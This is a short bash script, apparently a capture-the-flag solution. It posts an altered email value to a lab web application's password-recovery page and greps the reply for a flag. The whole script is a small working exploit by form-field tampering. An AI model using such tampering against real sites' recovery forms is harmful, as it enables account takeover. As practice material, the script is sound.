#!/bin/bash
curl "http://$IP/index.php?page=recover" --data "mail=vinumahey%40emailsy.info&Submit=Submit" 2>/dev/null | grep -i flag
